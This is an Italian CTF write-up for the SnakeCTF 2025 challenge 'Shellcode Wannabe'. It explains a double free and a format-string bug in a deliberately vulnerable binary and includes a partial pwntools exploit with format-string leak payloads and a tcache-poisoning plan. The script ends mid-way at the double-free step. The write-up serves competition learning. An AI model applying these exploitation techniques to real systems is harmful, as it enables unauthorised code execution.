+  <div class="post-content"><h1 id="finali-snakectf-2025-">Finali SnakeCTF 2025 🐍<a hidden class="anchor" aria-hidden="true" href="#finali-snakectf-2025-">#</a></h1>
+<p><img alt="logo SnakeCTF" loading="lazy" src="/images/snake.png"></p>
+<p>Prima di entrare nelle soluzioni delle due challenge su cui ho lavorato con <code>@Gabrain24</code> e <code>@Renny</code>, voglio dire quanto mi sono divertito a giocare questa CTF. È stato davvero molto divertente, e condividere l’esperienza con i miei compagni e amici del team <strong>pwnthem0le</strong> l’ha resa ancora migliore.</p>
+<h2 id="shellcode-wannabe">Shellcode Wannabe<a hidden class="anchor" aria-hidden="true" href="#shellcode-wannabe">#</a></h2>
+<p><strong>Shellcode Wannabe</strong> era un semplice binario ELF per <code>x86_64</code> scritto in <code>C</code>, che forniva all’utente quattro azioni principali:</p>
+<ul>
+<li>
+<p><strong>Create</strong> uno shellcode, allocando <em>0x400</em> byte sull’heap in un mapping di memoria <code>RW</code>.</p>
+</li>
+<li>
+<p><strong>Delete</strong> uno shellcode, liberando la chunk allocata durante la creazione.</p>
+</li>
+<li>
+<p><strong>Edit</strong> uno shellcode, sovrascrivendone i byte.</p>
+</li>
+<li>
+<p><strong>Execute</strong> lo shellcode, letteralmente chiamandolo:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">mov</span>     <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">s</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="nf">call</span>    <span class="no">rdx</span>
+</span></span></code></pre></div></li>
+</ul>
+<p>Prima che il servizio partisse effettivamente, la challenge invocava la funzione <code>initialize_challenge</code>, implementata come segue:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">initialize_challenge</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v0</span> <span class="o">=</span> <span class="nf">time</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">srand</span><span class="p">(</span><span class="n">v0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">menu</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">15</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">+</span> <span class="mi">65</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="nf">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400u</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// RWX memory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">result</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">shellcode</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Questa configurazione era interessante perché, come detto, la challenge ci consentiva di scrivere <strong>solo</strong> in una regione di memoria Read-Write, il che significava che non potevamo eseguire direttamente il nostro codice iniettato.
+Di conseguenza, per ottenere la flag era prima necessario leakare l’indirizzo dello shellcode e poi ottenere <em>una qualche forma di arbitrary write</em> su quel mapping RWX.</p>
+<p>Questo era possibile grazie a più vulnerabilità presenti nella challenge, tra cui:</p>
+<ul>
+<li><strong>Double free</strong>, il comando delete non controllava mai se un puntatore fosse già stato liberato.</li>
+<li><strong>Printf vulnerability</strong>, a ogni iterazione la challenge stampava la versione disassemblata dello shellcode usando <em>capstone</em>. Durante questo processo validava una <strong>secret di 16 byte</strong> (usata come sanity check sulla memoria dello shellcode) e, solo quando lo shellcode era esattamente lungo <strong>992 byte</strong>, aggiungeva una <strong>stringa di 32 byte</strong> alla fine del disassemblato.
+Questa stringa iniziava con il secret e terminava con 16 byte che potevano essere facilmente sovrascritti una volta conosciuta il secret.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">print_assembly</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">...</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v14</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">format</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v12</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xFFF0u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x10000u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">&gt;</span> <span class="mi">992</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="mi">992</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">strncmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">992</span><span class="p">),</span> <span class="n">secret</span><span class="p">,</span> <span class="mh">0x10u</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">cs_open</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v10</span> <span class="o">=</span> <span class="nf">cs_disasm</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v10</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="nf">snprintf</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">             <span class="o">&amp;</span><span class="n">format</span><span class="p">[</span><span class="n">v7</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">             <span class="mh">0x100u</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">             <span class="s">&#34;0x%lx:</span><span class="se">\t</span><span class="s">%s</span><span class="se">\t\t</span><span class="s">%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">             <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="mi">240</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">             <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="mi">240</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">34</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">             <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="mi">240</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">66</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="n">v7</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0xFFFF</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v7</span> <span class="o">+=</span> <span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">992</span> <span class="p">)</span> <span class="c1">// only when 992 bytes long
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">format</span><span class="p">[</span><span class="n">v7</span><span class="p">],</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">992</span><span class="p">),</span> <span class="mh">0x20u</span><span class="p">);</span> <span class="c1">// 32 bytes
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">snprintf</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="mh">0x10000u</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span> <span class="c1">// printf vulnerability
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">cs_free</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="n">v10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ERROR: Failed to disassemble given code!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">cs_close</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v9</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Tenendo questo a mente, il primo passo è stato leakare il secret.</p>
+<p>Si è rivelato piuttosto semplice: scrivendo uno shellcode di <em>992 byte</em> composto interamente da istruzioni <code>nop</code>, la challenge avrebbe leakato il secret come parte del disassemblato. Una volta leakata, potevamo sovrascriverla per andare in overflow nei 16 byte successivi, come spiegato sopra.</p>
+<p>Usando questa primitive siamo riusciti a leakare praticamente tutto ciò che ci serviva, inclusi:</p>
+<ul>
+<li>L’indirizzo di <code>main</code>.</li>
+<li>Un indirizzo casuale dell’heap.</li>
+</ul>
+<p>Da questi leak abbiamo ricavato sia il base address PIE dell’eseguibile principale, sia la base della regione heap.</p>
+<p>A questo punto, i passi rimanenti erano leakare l’indirizzo della regione RWX (possibile grazie al leak del <strong>PIE</strong> e quindi dell’indirizzo <code>.bss</code> del puntatore allo shellcode) e poi forzare <code>malloc</code> a restituire proprio quel puntatore.</p>
+<pre tabindex="0"><code>.bss:0000000000202050                 public secret
+.bss:0000000000202050 ; char secret[]
+.bss:0000000000202050 secret          dq ?                    ; DATA XREF: initialize_challenge+96↑o
+.bss:0000000000202050                                         ; print_assembly+8F↑o ...
+.bss:0000000000202058 qword_202058    dq ?                    ; DATA XREF: main+173↑r
+.bss:0000000000202060                 public shellcode
+.bss:0000000000202060 shellcode       dq ?                    ; DATA XREF: initialize_challenge+CF↑w
+.bss:0000000000202060                                         ; initialize_challenge+D6↑r
+.bss:0000000000202060 _bss            ends
+</code></pre><p>Per leakare la regione RWX è stato necessario usare di nuovo la primitive di printf, ma con un po’ di attenzione: l’indirizzo era <strong>allineato a 64 bit</strong>, il che significava che la presenza di un byte nullo iniziale faceva fallire <code>printf</code>.
+Questo dettaglio piuttosto sottile mi è costato circa un’ora di debugging durante la CTF.</p>
+<p>Una volta ottenuti tutti i leak, l’ultimo passo era ottenere un arbitrary write sulla regione RWX. L’approccio è stato:</p>
+<ol>
+<li><strong>Delete</strong> di uno shellcode, lasciando una chunk freed nella memoria della challenge.</li>
+<li><strong>Edit</strong> dello stesso shellcode, sovrascrivendo il puntatore <code>fwd</code> della chunk freed (tcache, dato che la size era piccola) in modo che puntasse alla regione RWX.</li>
+<li><strong>Create</strong> di due nuovi shellcode; la seconda allocazione restituiva un puntatore all’interno della regione RWX, permettendoci di scrivere un classico <code>bash shellcode</code>, che abbiamo poi eseguito per ottenere la flag remota.</li>
+</ol>
+<p>Se ti interessa l’exploit che ho sviluppato, eccolo qui (<del>è un po’ orribile tbh</del>):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">TOKEN</span> <span class="o">=</span> <span class="s2">&#34;XXXXXXXXXXXXXXXXXXXXXXXXXXXX&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./chall_patched&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-linux-x86-64.so.2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">],</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            b *print_assembly+656
+</span></span></span><span class="line"><span class="cl"><span class="s2">            b *main+598
+</span></span></span><span class="line"><span class="cl"><span class="s2">            c
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;shellcode-wannabe.challs.snakectf.org&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">TOKEN</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;create&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;create&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;edit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;nop&#34;</span><span class="p">)</span><span class="o">*</span><span class="mi">992</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;delete&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">992</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secret</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;create&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;edit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;nop&#34;</span><span class="p">)</span><span class="o">*</span><span class="mi">992</span> <span class="o">+</span> <span class="n">secret</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;%p%8209$p&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">993</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">16</span><span class="p">:]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">992</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">31</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">30</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x136c</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exe</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">f1</span> <span class="o">-</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;delete&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;leak heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;leak base addr exe: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;create&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;edit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;nop&#34;</span><span class="p">)</span><span class="o">*</span><span class="mi">992</span> <span class="o">+</span> <span class="n">secret</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;%1753$sA&#34;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x202060</span> <span class="o">+</span> <span class="mi">4861</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">993</span> <span class="o">+</span> <span class="mi">994</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()[</span><span class="mi">16</span><span class="p">:][:</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;delete&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">992</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># inizio double free</span>
